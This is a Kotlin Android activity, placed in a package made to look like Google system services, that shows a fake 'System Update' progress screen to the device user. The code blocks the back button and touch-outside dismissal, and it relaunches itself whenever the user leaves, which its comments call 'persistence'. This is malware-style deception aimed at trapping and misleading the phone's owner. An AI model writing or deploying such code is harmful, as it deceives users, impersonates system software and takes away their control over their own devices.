package com.google.android.systemservice.services

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.systemservice.R // Assuming R is generated correctly

class FakeSystemUpdateActivity : AppCompatActivity() {

    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private val handler = Handler(Looper.getMainLooper())
    private var progress = 0
    private var isRestarting = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_fake_update) // You'll need to create this layout

        progressBar = findViewById(R.id.update_progress_bar)
        statusText = findViewById(R.id.update_status_text)

        // Prevent going back or closing easily
        setFinishOnTouchOutside(false)
        setResult(RESULT_CANCELED)

        startFakeUpdate()
    }

    private fun startFakeUpdate() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                progress += (5..15).random() // Simulate varying progress
                if (progress > 100) {
                    progress = 100
                }
                progressBar.progress = progress
                statusText.text = "System Update: ${progress}% complete"

                if (progress == 100) {
                    handler.postDelayed({
                        // Simulate a reboot or just close after "completion"
                        finishAndRemoveTask()
                    }, 2000) // Stay on 100% for 2 seconds
                } else {
                    handler.postDelayed(this, (500..1500).random().toLong()) // Vary update speed
                }
            }
        }, 1000)
    }

    override fun onBackPressed() {
        // Do nothing to prevent user from exiting
        // Optionally, show a "System is busy" toast
    }

    override fun onResume() {
        super.onResume()
        isRestarting = false
    }

    override fun onPause() {
        super.onPause()
        handler.removeCallbacksAndMessages(null)
        // If user manages to exit, restart this activity to maintain persistence
        if (!isFinishing && !isRestarting) {
            isRestarting = true
            val intent = Intent(this, FakeSystemUpdateActivity::class.java)
            startActivity(intent)
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}
